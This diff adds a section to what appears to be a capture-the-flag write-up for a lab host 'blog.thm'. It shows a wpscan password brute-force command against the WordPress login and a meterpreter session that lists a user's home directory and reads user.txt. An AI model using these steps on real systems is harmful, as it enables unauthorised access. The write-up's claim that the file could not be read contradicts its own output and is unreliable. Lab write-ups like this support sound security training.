@@ -270,6 +270,44 @@ $ wpscan --url http://blog.thm/wp-login.php --passwords /usr/share/wordlists/roc
 
 ```
 
+Using the obtained credentials, we can leverage a Metasploit exploit targeting the specific WordPress version hosted on the site to gain a shell.
+
+
+```
+meterpreter > search -f user.txt
+Found 1 result...
+=================
+
+Path                   Size (bytes)  Modified (UTC)
+----                   ------------  --------------
+./home/bjoel/user.txt  57            2020-05-26 21:08:47 +0100
+
+meterpreter > cd ./home/bjoel
+meterpreter > ls
+Listing: /home/bjoel
+====================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+020666/rw-rw-rw-  0      cha   2024-10-06 21:45:55 +0100  .bash_history
+100644/rw-r--r--  220    fil   2018-04-04 19:30:26 +0100  .bash_logout
+100644/rw-r--r--  3771   fil   2018-04-04 19:30:26 +0100  .bashrc
+040700/rwx------  4096   dir   2020-05-25 14:15:58 +0100  .cache
+040700/rwx------  4096   dir   2020-05-25 14:15:58 +0100  .gnupg
+100644/rw-r--r--  807    fil   2018-04-04 19:30:26 +0100  .profile
+100644/rw-r--r--  0      fil   2020-05-25 14:16:22 +0100  .sudo_as_admin_successful
+100644/rw-r--r--  69106  fil   2020-05-26 19:33:24 +0100  Billy_Joel_Termination_May20-2020.pdf
+100644/rw-r--r--  57     fil   2020-05-26 21:08:47 +0100  user.txt
+
+meterpreter > cat user.txt
+You won't find what you're looking for here.
+
+TRY HARDER
+```
+
+Despite successfully locating user.txt in the /home/bjoel directory, we are unable to retrieve its contents due to insufficient privileges. 
+To gain access to the file, escalating privileges on the system is required.
+
 
 
 
